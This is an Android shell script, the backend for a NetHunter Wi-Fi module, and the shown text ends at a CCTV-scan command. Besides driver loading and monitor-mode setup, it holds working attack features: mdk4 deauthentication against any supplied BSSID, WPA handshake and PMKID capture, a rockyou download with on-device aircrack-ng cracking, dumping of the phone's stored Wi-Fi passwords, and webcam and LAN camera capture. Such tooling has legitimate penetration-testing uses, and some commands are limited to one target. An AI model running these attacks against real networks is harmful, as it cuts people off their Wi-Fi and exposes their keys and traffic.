#!/system/bin/sh
# OP11 NetHunter Wi-Fi
# Copyright (C) 2026 Bouteillepleine
# SPDX-License-Identifier: GPL-2.0-or-later
# Backend for the OP11 Nethunter Wi-Fi module WebUI. All output on stdout.
MODDIR=${0%/*}
DRV="$MODDIR/drivers"
PROFILE="$MODDIR/profile.conf"
HOPPID="$MODDIR/.hop.pid"
IW="$MODDIR/bin/iw"; [ -x "$IW" ] || IW="$(command -v iw 2>/dev/null || echo iw)"
MDK4="$MODDIR/bin/mdk4"; [ -x "$MDK4" ] || MDK4="$(command -v mdk4 2>/dev/null || echo mdk4)"
TCPDUMP="$MODDIR/bin/tcpdump"; [ -x "$TCPDUMP" ] || TCPDUMP="$(command -v tcpdump 2>/dev/null || echo tcpdump)"
HCX="$MODDIR/bin/hcxdumptool"; [ -x "$HCX" ] || HCX="$(command -v hcxdumptool 2>/dev/null || echo hcxdumptool)"
HCXT="$MODDIR/bin/hcxpcapngtool"; [ -x "$HCXT" ] || HCXT="$(command -v hcxpcapngtool 2>/dev/null || echo hcxpcapngtool)"
KOCRC="$MODDIR/bin/kocrc"
# Outside the module directory on purpose: installing a module replaces that
# directory wholesale, so captures, camera recordings and sniffed credentials
# kept inside it were destroyed by every single update.
CAPDIR="/data/adb/nethunter-captures"
VLG="$MODDIR/bin/v4lgrab"           # USB (UVC) webcam capture
CSC="$MODDIR/bin/camscan"           # LAN CCTV/DVR discovery
FFM="$MODDIR/bin/ffmpeg"            # bundled static ffmpeg (RTSP snapshot, no chroot)
CAMCONF="$MODDIR/cams.conf"         # saved camera profiles (name<TAB>rtsp url)
KROOT=/data/local/nhsystem/kalifs   # NetHunter Kali chroot (for on-device cracking)
_kmount() { for m in proc dev; do grep -q " $KROOT/$m " /proc/mounts 2>/dev/null || mount -o bind "/$m" "$KROOT/$m" 2>/dev/null; done; }
ACK="$MODDIR/bin/aircrack-ng"       # bundled aircrack-ng (chroot-free WPA crack)
_rockyou() { for c in "$KROOT/usr/share/wordlists/rockyou.txt" /sdcard/Download/rockyou.txt "$MODDIR/wordlist.txt"; do [ -f "$c" ] && { echo "$c"; return; }; [ -f "$c.gz" ] && { gunzip -kf "$c.gz" 2>/dev/null && [ -f "$c" ] && { echo "$c"; return; }; }; done; }

# aircrack-ng's osdep refuses to start unless it can find the legacy wireless
# tools, and if it finds none it decides the adapter is ndiswrapper and bails
# with "Ndiswrapper doesn't support monitor mode". We drive monitor mode through
# nl80211 instead, so give it stubs that simply fail: /tmp is the only directory
# osdep searches that is writable here, and it is cleared on every boot.
# Transmitting works on this device. Measured on OP11 2026-09-13 with lwfinger
# rtw88: an mdk4 deauth burst put 255 frames on the air, read back off the air
# by a concurrent capture, with the kernel untouched. The OP15 TX panic does
# NOT reproduce here, so the guard below is opt-in rather than opt-out.
_tx_guard() {
  # Set NH_BLOCK_TX=1 to refuse transmitting anyway.
  [ "${NH_BLOCK_TX:-0}" = "1" ] || return 0
  echo "refused: transmitting panics the kernel on this driver (RX-only)."
  echo "monitor mode and passive capture work; anything that transmits does not."
  echo "capture passively and wait for a client to associate to get a handshake."
  echo "override with NH_ALLOW_TX=1 if you are testing a driver fix."
  return 1
}

# rtw88 refuses SIOCSIWTXPOW on a monitor interface (-95) but accepts it in
# managed, and the value survives the switch back -- so set it in managed and
# restore the mode, instead of telling the user it is unsupported.
_set_txpower() {
  i=$1; p=$2; was=$(_mode_of "$i")
  if [ "$was" = monitor ]; then
    ip link set "$i" down 2>/dev/null; "$IW" dev "$i" set type managed 2>/dev/null; ip link set "$i" up 2>/dev/null
  fi
  o=$("$IW" dev "$i" set txpower fixed "$p" 2>&1); rc=$?
  if [ "$was" = monitor ]; then
    ip link set "$i" down 2>/dev/null; "$IW" dev "$i" set type monitor 2>/dev/null; ip link set "$i" up 2>/dev/null
  fi
  if [ "$rc" = 0 ]; then echo "txpower ${p}mBm (now $("$IW" dev "$i" info | awk "/txpower/{print \$2, \$3}"))"
  else echo "${o:-txpower not accepted by this driver}"; fi
}
_wtstubs() {
  for t in iwpriv iwconfig; do
    [ -x "/tmp/$t" ] && continue
    { echo '#!/system/bin/sh'; echo 'exit 1'; } > "/tmp/$t" 2>/dev/null && chmod 755 "/tmp/$t" 2>/dev/null
  done
}

# Channel of a BSSID, from a scan. Only works in managed mode -- iw cannot scan
# from a monitor interface -- so callers must cope with an empty answer.
_chan_of() {
  "$IW" dev "$1" scan 2>/dev/null | awk -v want="$(echo "$2" | tr 'A-Z' 'a-z')" '
    /^BSS /{b=tolower(substr($2,1,17))}
    /primary channel:|DS Parameter set: channel/{if(b==want){print $NF; exit}}'
}

# Can we actually hear the target on the current channel? mdk4 transmits on
# whichever channel the radio is parked on, so aiming at a BSSID that is not
# there -- wrong channel, or the AP simply switched off -- looks identical to a
# working attack: the button says "deauthing" and nothing happens. One beacon is
# enough to tell the two apart.
_audible() {
  timeout 3 "$TCPDUMP" -i "$1" -c 1 -nn "wlan addr3 $2" 2>/dev/null | grep -c .
}

_drivers() { for f in "$DRV"/*.ko; do [ -e "$f" ] && basename "$f" .ko; done; }
_loaded()  { lsmod 2>/dev/null | grep -q "^$(echo "$1" | tr - _) "; }
_ifaces()  { for d in /sys/class/net/wlan*; do [ -e "$d" ] && basename "$d"; done; }
_drv_of()  { l=$(readlink -f "/sys/class/net/$1/device/driver" 2>/dev/null); [ -n "$l" ] && basename "$l" || echo "-"; }
_mode_of() { "$IW" dev "$1" info 2>/dev/null | awk '/type/{print $2; exit}'; }
_mac_of()  { cat "/sys/class/net/$1/address" 2>/dev/null; }
_has_iw()  { [ -x "$IW" ] && "$IW" --version >/dev/null 2>&1 && echo true || echo false; }
_extiface() {
  for i in $(_ifaces); do
    case "$(_drv_of "$i")" in *rtl*|*88[0-9]2*|8812au|8821au|88x2bu|ath9k*|mt76*|rtw*|rt2800*) echo "$i"; return;; esac
  done
  for i in $(_ifaces); do [ "$i" != wlan0 ] && { echo "$i"; return; }; done
}
_usbinfo() {
  dev=$(readlink -f "/sys/class/net/$1/device" 2>/dev/null)
  while [ -n "$dev" ] && [ "$dev" != "/" ]; do
    [ -f "$dev/idVendor" ] && { printf '%s:%s %s' "$(cat "$dev/idVendor")" "$(cat "$dev/idProduct")" "$(cat "$dev/product" 2>/dev/null)"; return; }
    dev=$(dirname "$dev")
  done
}
# VID:PID -> "driver<TAB>Chipset". Covers the common injection adapters.
_lookup() {
  case "$1" in
    0bda:8812|0bda:881a|0bda:881b|0bda:881c) printf 'rtw_8812au\tRTL8812AU';;
    0bda:8811|0bda:a811|0bda:0811|2357:0101|2357:010c|0b05:17d2) printf 'rtw_8821au\tRTL8811AU/8821AU';;
    0bda:b812|0bda:b82c|0bda:b811|2357:012d|2357:0138) printf 'rtw_8822bu\tRTL8812BU/8822BU';;
    0cf3:9271|0cf3:7015|040d:3801|0cf3:1006|0cf3:b002) printf 'ath9k_htc\tAtheros AR9271';;
    148f:7601) printf 'mt7601u\tMediaTek MT7601U';;
    0e8d:7961|3574:6211|0e8d:7922|13b1:0045) printf 'mt7921u\tMediaTek MT7921 (WiFi6)';;
    0e8d:7612|0e8d:7632|0e8d:7610|0846:9053|0b05:17eb|043e:310c) printf 'mt76x2u\tMediaTek MT7612U';;
    0bda:c811|0bda:c820|0bda:c82c|331b:1010) printf 'rtw_8821cu\tRTL8821CU';;
    0bda:d723|0bda:d722) printf 'rtw_8723du\tRTL8723DU';;
    148f:5370|148f:5372|148f:3070|148f:3572|148f:5572|0b05:17d1) printf 'rt2800usb\tRalink RT2800USB';;
    0cf3:9170|0cf3:1001|0846:9010|cace:0300|07d1:3c10|0cf3:1010|04bb:093f) printf 'carl9170\tAtheros AR9170';;
    *) printf '\t';;
  esac
}
# Load a set of driver names with retry, so multi-module families (ath9k, mt76,
# rtw88 need core/lib/hw first) resolve regardless of order.
_load_retry() {
  changed=1
  while [ "$changed" = 1 ]; do
    changed=0
    for n in "$@"; do
      _loaded "$n" && continue
      [ -f "$DRV/$n.ko" ] || continue
      insmod "$DRV/$n.ko" 2>/dev/null && changed=1
    done
  done
}
# Family of drivers to load for a matched primary driver (deps + siblings).
_family() {
  case "$1" in
    ath9k*)  echo "ath ath9k_hw ath9k_common ath9k_htc" ;;
    carl9170*) echo "ath carl9170" ;;
    mt7921*) echo "mt76 mt76-usb mt76-connac-lib mt792x-lib mt792x-usb mt7921-common mt7921u" ;;
    mt76x2*) echo "mt76 mt76-usb mt76x02-lib mt76x02-usb mt76x2-common mt76x2u" ;;
    mt76*)   echo "mt76 mt76-usb mt76-connac-lib mt792x-lib mt792x-usb mt7921-common mt7921u" ;;
    mt7601*) echo "mt7601u" ;;
    rt2800*) echo "rt2x00lib rt2x00usb rt2800lib rt2800usb" ;;
    rtw_8812au) echo "rtw_core rtw_usb rtw_88xxa rtw_8812a rtw_8812au" ;;
    rtw_8821au) echo "rtw_core rtw_usb rtw_88xxa rtw_8821a rtw_8821au" ;;
    rtw_8822bu) echo "rtw_core rtw_usb rtw_8822b rtw_8822bu" ;;
    rtw_8821cu) echo "rtw_core rtw_usb rtw_8821c rtw_8821cu" ;;
    rtw_8723du) echo "rtw_core rtw_usb rtw_8723x rtw_8723d rtw_8723du" ;;
    rtw_8822cu) echo "rtw_core rtw_usb rtw_8822c rtw_8822cu" ;;
    rtw*)    echo "rtw_core rtw_usb $1" ;;
    *)       echo "$1" ;;
  esac
}
# Detected USB Wi-Fi adapters: "vid:pid<TAB>driver<TAB>chipset" per line.
_detect() {
  for d in /sys/bus/usb/devices/*; do
    [ -f "$d/idVendor" ] || continue
    vp="$(cat "$d/idVendor"):$(cat "$d/idProduct")"
    dc="$(_lookup "$vp")"; drv="${dc%%	*}"
    [ -n "$drv" ] && printf '%s\t%s\n' "$vp" "$dc"
  done
}

case "$1" in
  find) i=$(_extiface); [ -n "$i" ] && echo "$i" || echo "none" ;;
  detect) _detect ;;
  # Load ONLY the driver matching a plugged adapter (cleaner + stealthier).
  loadmatch)
    _detect | while IFS='	' read -r vp drv name; do
      _load_retry $(_family "$drv")
      _loaded "$drv" && echo "· $name: loaded ($drv)" || echo "· $name: $drv failed (see dmesg)"
    done
    [ -z "$(_detect)" ] && echo "no known adapter detected — plug it in, or use Load all"
    ;;
  startmon)
    sh "$0" loadmatch >/dev/null 2>&1 || true
    for d in $(_drivers); do _loaded "$d" || insmod "$DRV/$d.ko" 2>/dev/null; done
    i=$(_extiface); [ -z "$i" ] && { echo "no external adapter found — is it plugged in?"; exit 0; }
    ip link set "$i" down 2>&1; "$IW" dev "$i" set type monitor 2>&1 || airmon-ng start "$i" 2>&1
    ip link set "$i" up 2>&1; "$IW" dev "$i" set power_save off 2>/dev/null
    vp=$(_usbinfo "$i" | awk '{print $1}')
    if [ -n "$vp" ] && [ -f "$MODDIR/aprofiles/$(echo "$vp"|tr ':' '_').conf" ]; then
      sh "$0" aprofile apply "$vp" >/dev/null 2>&1
    elif [ -f "$PROFILE" ]; then sh "$0" profile apply >/dev/null 2>&1; fi
    echo "$i mode=$(_mode_of "$i")" ;;
  stopmon)
    sh "$0" hopstop >/dev/null 2>&1
    i=${2:-$(_extiface)}; [ -z "$i" ] && exit 0
    ip link set "$i" down 2>&1; "$IW" dev "$i" set type managed 2>&1; ip link set "$i" up 2>&1
    echo "$i mode=$(_mode_of "$i")" ;;
  scan)
    i=${2:-$(_extiface)}; [ -z "$i" ] && { echo "no adapter"; exit 0; }
    _tx_guard || exit 0
    # iw cannot scan from a monitor interface, and the WebUI's normal flow is
    # Start Monitor then Scan -- which returned an empty list every time. Drop
    # to managed for the scan and put the interface back the way it was.
    was=$(_mode_of "$i")
    if [ "$was" = monitor ]; then
      ip link set "$i" down 2>/dev/null; "$IW" dev "$i" set type managed 2>/dev/null
    fi
    ip link set "$i" up 2>/dev/null
    # iw indents SSID and channel with a tab and prints the channel AFTER the
    # SSID, so matching ' SSID: ' and printing on the SSID line gave <hidden>
    # and ch? for every network. Buffer each BSS, emit when the next starts.
    "$IW" dev "$i" scan 2>/dev/null | awk '
      function emit(){ if(b!="") printf "%-22s ch%-4s %sdBm  %s\n", ss, ch, sig, b }
      /^BSS /{emit(); b=substr($2,1,17); ss="<hidden>"; ch="?"; sig="?"}
      /signal:/{sig=$2}
      /SSID:/{v=substr($0,index($0,"SSID:")+6); gsub(/[ 	]+$/,"",v); if(v!="" && v !~ /^(.x00)+$/)ss=v}
      /primary channel:|DS Parameter set: channel/{ch=$NF}
      END{emit()}'
    if [ "$was" = monitor ]; then
      ip link set "$i" down 2>/dev/null; "$IW" dev "$i" set type monitor 2>/dev/null
    fi
    ip link set "$i" up 2>/dev/null ;;
  # background channel hopping across a comma list, e.g. hop wlan1 1,6,11
  hop)
    sh "$0" hopstop >/dev/null 2>&1
    i=$2; chans=$(echo "${3:-1,6,11}" | tr ',' ' ')
    ( while :; do for c in $chans; do "$IW" dev "$i" set channel "$c" 2>/dev/null; sleep "${HOP_DWELL:-1}"; done; done ) &
    echo $! > "$HOPPID"; echo "hopping $i: $3" ;;
  hopstop) [ -f "$HOPPID" ] && kill "$(cat "$HOPPID")" 2>/dev/null; rm -f "$HOPPID"; echo "hop stopped" ;;
  usbinfo) echo "$(_usbinfo "${2:-$(_extiface)}")" ;;
  powersave) "$IW" dev "$2" set power_save "${3:-off}" 2>&1 && echo "power_save ${3:-off}" ;;
  txpreset)
    i=$2; case "$3" in low) p=500;; med) p=1500;; max) p=3000;; *) p=$3;; esac
    _set_txpower "$i" "$p" ;;
  # persist preferred region/power-save/txpower; apply on monitor start
  profile)
    case "$2" in
      save) { echo "REGION=${3:-}"; echo "PS=${4:-off}"; echo "TXP=${5:-}"; } > "$PROFILE"; echo "profile saved" ;;
      apply) [ -f "$PROFILE" ] || exit 0; . "$PROFILE"; i=$(_extiface)
             [ -n "$REGION" ] && "$IW" reg set "$REGION" 2>/dev/null
             [ -n "$i" ] && [ -n "$PS" ] && "$IW" dev "$i" set power_save "$PS" 2>/dev/null
             [ -n "$i" ] && [ -n "$TXP" ] && "$IW" dev "$i" set txpower fixed "$TXP" 2>/dev/null
             echo "profile applied" ;;
      show) [ -f "$PROFILE" ] && cat "$PROFILE" || echo "no profile" ;;
    esac ;;
  # one-tap troubleshooting bundle
  diag)
    echo "== iw =="; "$IW" --version 2>&1
    echo "== detected adapters =="; _detect
    echo "== loaded drivers =="; for d in $(_drivers); do printf '%s: %s\n' "$d" "$(_loaded "$d" && echo yes || echo no)"; done
    echo "== interfaces =="; "$IW" dev 2>/dev/null
    echo "== dmesg (wifi) =="; dmesg 2>/dev/null | grep -iE "rtl|88[0-9]2|ath9k|mt76|rtw|cfg80211|usb .*net" | tail -25 ;;
  # firmware presence check across Android firmware search paths
  fwcheck)
    paths="$MODDIR/firmware /vendor/firmware /vendor/etc/firmware /system/etc/firmware /lib/firmware /firmware/image /odm/firmware"
    for e in "AR9271:htc_9271.fw" "AR7010:htc_7010.fw" "MT7601U:mt7601u.bin" "MT76x2:mt7662.bin" "CARL9170:carl9170-1.fw" "RT2870:rt2870.bin"; do
      name="${e%%:*}"; fw="${e##*:}"; found=MISSING
      for p in $paths; do [ -f "$p/$fw" ] && { found="$p"; break; }; done
      printf '%s\t%s\t%s\n' "$name" "$fw" "$found"
    done ;;
  # live link/station info for the adapter (signal, rate, ssid)
  link)
    i=${2:-$(_extiface)}; [ -z "$i" ] && { echo "no adapter"; exit 0; }
    L="$("$IW" dev "$i" link 2>/dev/null)"
    if echo "$L" | grep -q "Connected"; then echo "$L" | grep -iE "SSID|signal|rx bitrate|tx bitrate|freq"
    else "$IW" dev "$i" station dump 2>/dev/null | grep -iE "Station|signal:|tx bitrate|rx bitrate" | head -20
      [ -z "$("$IW" dev "$i" station dump 2>/dev/null)" ] && echo "no link/stations (monitor mode shows peers only when capturing)"; fi ;;
  # per-adapter presets, keyed by USB VID:PID
  aprofile)
    vp="$3"; d="$MODDIR/aprofiles"; f="$d/$(echo "$vp" | tr ':' '_').conf"
    case "$2" in
      save)  mkdir -p "$d"; { echo "REGION=${4:-}"; echo "PS=${5:-off}"; echo "TXP=${6:-}"; } > "$f"; echo "preset saved for $vp" ;;
      apply) [ -f "$f" ] || { echo "no preset for $vp"; exit 0; }; . "$f"; i=$(_extiface)
             [ -n "$REGION" ] && "$IW" reg set "$REGION" 2>/dev/null
             [ -n "$i" ] && [ -n "$PS" ] && "$IW" dev "$i" set power_save "$PS" 2>/dev/null
             [ -n "$i" ] && [ -n "$TXP" ] && "$IW" dev "$i" set txpower fixed "$TXP" 2>/dev/null
             echo "preset applied for $vp" ;;
      show)  [ -f "$f" ] && cat "$f" || echo "no preset for $vp" ;;
    esac ;;
  # --- attack tooling (monitor mode required) ---
  # deauth an AP (kicks its clients; used to force a WPA handshake). Runs in background.
  deauth)
    i=${2:-$(_extiface)}; bssid=$3; ch=$4
    [ -z "$bssid" ] && { echo "need a BSSID"; exit 0; }
    sh "$0" deauthstop >/dev/null 2>&1
    [ -z "$ch" ] && ch=$(_chan_of "$i" "$bssid")
    [ -z "$ch" ] && { echo "cannot tell which channel $bssid is on - run Scan first, or type its channel"; exit 0; }
    "$IW" dev "$i" set channel "$ch" 2>/dev/null
    [ "$(_audible "$i" "$bssid")" = "0" ] && { echo "$bssid is not on the air on ch$ch - nothing to deauth"; exit 0; }
    _tx_guard || exit 0
    _wtstubs
    ( "$MDK4" "$i" d -B "$bssid" >/dev/null 2>&1 ) & echo $! > "$MODDIR/.deauth.pid"
    echo "deauthing $bssid on $i ch$ch (Stop to end)" ;;
  deauthstop) [ -f "$MODDIR/.deauth.pid" ] && kill "$(cat "$MODDIR/.deauth.pid")" 2>/dev/null; rm -f "$MODDIR/.deauth.pid"; echo "deauth stopped" ;;
  # capture to a pcap (grab the handshake). Optionally lock to a channel first.
  capture)
    i=${2:-$(_extiface)}; ch=$3; mkdir -p "$CAPDIR"
    [ -n "$ch" ] && "$IW" dev "$i" set channel "$ch" 2>/dev/null
    f="$CAPDIR/cap_$(date +%Y%m%d_%H%M%S).pcap"
    sh "$0" capturestop >/dev/null 2>&1
    ( "$TCPDUMP" -i "$i" -w "$f" >/dev/null 2>&1 ) & echo $! > "$MODDIR/.cap.pid"
    echo "$f" > "$MODDIR/.cap.file"; echo "capturing -> $f" ;;
  capturestop) [ -f "$MODDIR/.cap.pid" ] && kill "$(cat "$MODDIR/.cap.pid")" 2>/dev/null; rm -f "$MODDIR/.cap.pid"
    f=$(cat "$MODDIR/.cap.file" 2>/dev/null); rm -f "$MODDIR/.cap.file"
    if [ -n "$f" ] && [ -s "$f" ]; then echo "saved $f"; else echo "not capturing"; fi ;;
  captures) ls -1 "$CAPDIR" 2>/dev/null | grep -q . && ls -1 "$CAPDIR" || echo "(none)" ;;
  # clientless PMKID + handshake capture (hcxdumptool self-manages monitor mode)
  pmkid)
    i=${2:-$(_extiface)}; [ -z "$i" ] && { echo "no adapter"; exit 0; }
    bssid=$3
    # hcxdumptool is NOT passive: with no filter it solicits every AP in range
    # and harvests handshakes from networks that are not yours. Measured here
    # on 2026-09-13 -- one unfiltered run collected five neighbouring networks.
    # Require a target and pin the receive path to it with a compiled BPF.
    if [ -z "$bssid" ]; then
      echo "need a target BSSID: run Scan and tap your own network first."
      echo "without a filter hcxdumptool solicits every AP in range, including"
      echo "networks that are not yours -- so this refuses to run untargeted."
      exit 0
    fi
    mkdir -p "$CAPDIR"
    f="$CAPDIR/pmkid_$(date +%Y%m%d_%H%M%S).pcapng"
    sh "$0" pmkidstop >/dev/null 2>&1
    _tx_guard || exit 0
    bpf="$MODDIR/.pmkid.bpf"
    "$HCX" --bpfc="wlan addr3 $bssid" > "$bpf" 2>/dev/null
    [ -s "$bpf" ] || { echo "could not compile a filter for $bssid"; exit 0; }
    ( "$HCX" -i "$i" --bpf="$bpf" -w "$f" >/dev/null 2>&1 ) & echo $! > "$MODDIR/.pmkid.pid"
    echo "$f" > "$MODDIR/.pmkid.file"; echo "PMKID/handshake capture on $bssid -> $f" ;;
  pmkidstop) [ -f "$MODDIR/.pmkid.pid" ] && kill "$(cat "$MODDIR/.pmkid.pid")" 2>/dev/null; rm -f "$MODDIR/.pmkid.pid"
    f=$(cat "$MODDIR/.pmkid.file" 2>/dev/null); rm -f "$MODDIR/.pmkid.file"
    if [ -n "$f" ] && [ -s "$f" ]; then echo "saved $f"; else echo "not running"; fi ;;
  # reveal Wi-Fi passwords THIS phone has saved (your own networks; root)
  savedpw)
    found=0
    for f in /data/misc/apexdata/com.android.wifi/WifiConfigStore.xml /data/misc/wifi/WifiConfigStore.xml; do
      [ -f "$f" ] || continue; found=1
      sed -e 's/&quot;//g' "$f" | grep -oE 'name="(SSID|PreSharedKey|WEPKeys)">[^<]*' | \
        sed -E 's/name="SSID">(.*)/\1/; s/name="PreSharedKey">(.*)/    key: \1/; s/name="WEPKeys">(.*)/    wep: \1/'
    done
    [ $found -eq 0 ] && echo "WifiConfigStore.xml not found (need root)" ;;
  # ---- on-device cracking (bundled aircrack-ng; wordlist from chroot rockyou or your own) ----
  crackstatus)
    [ -x "$ACK" ] || { echo "nobin"; exit 0; }
    if [ -n "$(_rockyou)" ]; then echo "ready"
    elif [ -f /sdcard/Download/rockyou.txt.part ]; then echo "downloading"
    else echo "nowordlist"; fi ;;
  # Does the mac80211 we ship match the cfg80211 THIS device runs? The drivers
  # resolve against our mac80211, but our mac80211 resolves against the ROM's
  # cfg80211 - and a single mismatched CRC there is not a failed insmod, it is a
  # kernel panic the moment a driver registers a wiphy. Worth one check after
  # flashing a different kernel or taking a ROM update.
  verify)
    ko=$2
    if [ -z "$ko" ]; then
      for c in /vendor_dlkm/lib/modules/cfg80211.ko /vendor/lib/modules/cfg80211.ko \
               /system/lib/modules/cfg80211.ko /lib/modules/cfg80211.ko; do
        [ -f "$c" ] && { ko=$c; break; }
      done
    fi
    [ -f "$ko" ] || { echo "no cfg80211.ko found on this device - pass its path"; exit 0; }
    [ -x "$KOCRC" ] || { echo "kocrc not bundled in this build"; exit 0; }
    [ -f "$MODDIR/mac80211.ko" ] || { echo "this module ships no mac80211.ko"; exit 0; }
    T=/data/local/tmp
    "$KOCRC" -e "$ko" 2>/dev/null > "$T/.nhdev"
    "$KOCRC" -i "$MODDIR/mac80211.ko" 2>/dev/null > "$T/.nhours"
    echo "device : $ko"
    echo "         $(grep -ao "vermagic=[^ ]*" "$ko" | head -1)"
    echo "kernel : $(uname -r)"
    # toybox has no join, so do the whole comparison inside awk
    awk '
      NR==FNR { dev[$2]=$1; next }
      ($2 in dev) {
        n++
        if (dev[$2] != $1) { bad++; printf "MISMATCH %-36s device=0x%s ours=0x%s\n", $2, dev[$2], $1 }
      }
      END {
        printf "%d cfg80211 symbol(s) compared, %d mismatched\n", n+0, bad+0
        if (n+0 == 0) print "nothing compared - is that file really a cfg80211 module?"
        else if (bad+0) print "FAIL: our mac80211 will not load here, and may panic the kernel"
        else print "OK: our mac80211 matches this device cfg80211"
      }' "$T/.nhdev" "$T/.nhours"
    rm -f "$T/.nhdev" "$T/.nhours" ;;
  # rockyou is 134 MB and a generic public list, so it is fetched on demand
  # rather than bundled. _rockyou() also accepts a .gz and gunzips it, so a
  # hand-copied rockyou.txt.gz in /sdcard/Download works just as well.
  getwordlist)
    url=${2:-https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt}
    dst=${3:-/sdcard/Download/rockyou.txt}
    [ -s "$dst" ] && { echo "already installed: $dst"; exit 0; }
    command -v curl >/dev/null 2>&1 || { echo "no curl here - copy rockyou.txt or rockyou.txt.gz into /sdcard/Download yourself"; exit 0; }
    sh "$0" getwordliststop >/dev/null 2>&1
    mkdir -p "$(dirname "$dst")" 2>/dev/null
    ( curl -fsSL --retry 3 -o "$dst.part" "$url" && mv "$dst.part" "$dst" && chmod 644 "$dst" ) >/dev/null 2>&1 &
    echo $! > "$MODDIR/.wl.pid"
    echo "downloading rockyou (~134 MB) -> $dst"
    echo "it keeps going in the background; check Wordlists again in a minute" ;;
  getwordliststop)
    [ -f "$MODDIR/.wl.pid" ] && kill "$(cat "$MODDIR/.wl.pid")" 2>/dev/null
    rm -f "$MODDIR/.wl.pid" /sdcard/Download/rockyou.txt.part
    echo "download stopped" ;;
  # hashcat-ready hashes for the PC route (hashcat -m 22000)
  hashes)
    [ -x "$HCXT" ] || { echo "hcxpcapngtool not bundled in this build"; exit 0; }
    cap="$2"; [ -f "$cap" ] || cap="$CAPDIR/$2"
    [ -f "$cap" ] || { echo "capture not found: ${2:-<none>}"; exit 0; }
    h="$CAPDIR/$(basename "${cap%.*}").hc22000"
    "$HCXT" -o "$h" "$cap" 2>&1 | grep -iE "PMKID|EAPOL M|written|hashes" | head -6
    if [ -s "$h" ]; then echo "$(grep -c . "$h") hash(es) -> $h"
    else rm -f "$h"; echo "no PMKID or usable handshake in $(basename "$cap")"; fi ;;
  wordlists)
    ls -1 "$KROOT/usr/share/wordlists/" 2>/dev/null | grep -iE '\.(txt|lst|gz|dic)$' | head -30
    [ -f /sdcard/Download/rockyou.txt ] && echo "/sdcard/Download/rockyou.txt"
    if [ -f /sdcard/Download/rockyou.txt.part ]; then
      echo "(downloading: $(( $(stat -c %s /sdcard/Download/rockyou.txt.part 2>/dev/null || echo 0) / 1048576 )) MB of ~134 MB)"
    elif [ ! -d "$KROOT/usr/share/wordlists" ] && [ ! -f /sdcard/Download/rockyou.txt ]; then
      echo "(no wordlist — tap Get rockyou, or put rockyou.txt(.gz) in /sdcard/Download)"
    fi ;;
  crack)
    [ -x "$ACK" ] || { echo "aircrack-ng not bundled in this build"; exit 0; }
    cap="$2"; [ -f "$cap" ] || cap="$CAPDIR/$2"
    [ -f "$cap" ] || { echo "capture not found: ${2:-<none>}"; exit 0; }
    # aircrack-ng reads pcap, not pcapng, and reported 'No networks found' on
    # every hcxdumptool capture. tcpdump reads pcapng and writes pcap, so the
    # PMKID route works on-device instead of being PC-only.
    case "$cap" in *.pcapng)
      c2="${cap%.pcapng}.pcap"
      "$TCPDUMP" -r "$cap" -w "$c2" >/dev/null 2>&1
      [ -s "$c2" ] || { echo "could not convert $(basename "$cap")"; exit 0; }
      echo "converted $(basename "$cap") -> $(basename "$c2")"; cap="$c2" ;;
    esac
    wl="$3"; [ -n "$wl" ] && [ -f "${wl}.gz" ] && [ ! -f "$wl" ] && gunzip -kf "${wl}.gz" 2>/dev/null
    [ -z "$wl" ] && wl="$(_rockyou)"
    [ -f "$wl" ] || { echo "no wordlist — install the Kali chroot (rockyou) or pass a path / put rockyou.txt in /sdcard/Download"; exit 0; }
    # With more than one BSSID in the capture aircrack-ng stops and asks for an
    # index, which from the WebUI just looks like a hang. Pick the network that
    # actually has a handshake and pin it with -b.
    bss=$3; [ "$bss" = "$wl" ] && bss=""
    [ -z "$bss" ] && bss=$("$ACK" "$cap" 2>/dev/null | awk "/\(1 handshake\)|WPA \([1-9]/{print \$2; exit}")
    [ -z "$bss" ] && bss=$("$ACK" "$cap" 2>/dev/null | awk "/PMKID/{print \$2; exit}")
    if [ -n "$bss" ]; then echo "== cracking $(basename "$cap") [$bss] with $(basename "$wl") =="
    else echo "== cracking $(basename "$cap") with $(basename "$wl") =="; fi
    if [ -n "$bss" ]; then OUT=$("$ACK" -w "$wl" -b "$bss" "$cap" 2>&1)
    else OUT=$("$ACK" -w "$wl" "$cap" </dev/null 2>&1); fi
    key=$(echo "$OUT" | grep -oE "KEY FOUND! \[ [^]]* \]" | head -1)
    if [ -n "$key" ]; then echo "✅ $key"
    else
      echo "$OUT" | tr -d '\r' | grep -ioE "Read [0-9]+ packets|[0-9]+ handshake|No valid WPA handshakes found|Passphrase not in dictionary|Got no data packets|Quitting aircrack-ng" | awk '!s[$0]++' | head -6
      echo "(no key — bigger wordlist, or the capture lacks a full handshake/PMKID)"
    fi
    ;;
  # ---- USB (UVC) webcam over OTG — kernel USB_VIDEO_CLASS=y, no driver needed ----
  camlist)  o=$("$VLG" list 2>/dev/null); [ -n "$o" ] && echo "$o" || echo "(no /dev/video* — plug a USB webcam via OTG)" ;;
  caminfo)  [ -n "$2" ] && "$VLG" info "$2" 2>&1 || echo "usage: caminfo /dev/videoN" ;;
  camsnap)  # capture one frame, emit base64 JPEG for inline preview
    dev="${2:-/dev/video0}"; [ -e "$dev" ] || { echo "ERR:no device $dev"; exit 0; }
    tmp="$MODDIR/.cam.jpg"; rm -f "$tmp"
    "$VLG" snap "$dev" "$tmp" ${3:+$3 $4} >/dev/null 2>"$MODDIR/.cam.err"
    if [ -s "$tmp" ] && head -c2 "$tmp" | od -An -tx1 2>/dev/null | grep -qi 'ff d8'; then
      base64 "$tmp" 2>/dev/null | tr -d '\n'
    else echo "ERR:$(cat "$MODDIR/.cam.err" 2>/dev/null | head -1 || echo 'no JPEG frame — check caminfo for an MJPEG mode')"; fi ;;
  camsave)  # keep a snapshot in captures/
    dev="${2:-/dev/video0}"; [ -e "$dev" ] || { echo "no device $dev"; exit 0; }
    mkdir -p "$CAPDIR"; f="$CAPDIR/cam_$(date +%Y%m%d_%H%M%S).jpg"
    "$VLG" snap "$dev" "$f" ${3:+$3 $4} 2>&1 >/dev/null && echo "saved $f" || echo "capture failed" ;;
  camrec)   # record ~N seconds of MJPEG (≈15 fps) to captures/
    dev="${2:-/dev/video0}"; sec="${3:-5}"; [ -e "$dev" ] || { echo "no device $dev"; exit 0; }
    mkdir -p "$CAPDIR"; f="$CAPDIR/cam_$(date +%Y%m%d_%H%M%S).mjpeg"; fr=$((sec*15))
    "$VLG" rec "$dev" "$f" "$fr" ${4:+$4 $5} 2>&1 >/dev/null && echo "saved $f (${sec}s, remux with ffmpeg)" || echo "record failed" ;;
  # ---- Network cameras (your own CCTV/DVR): discover, view local or remote ----
  cctvscan) "$CSC" scan "${2:-auto}" 2>&1 ;;
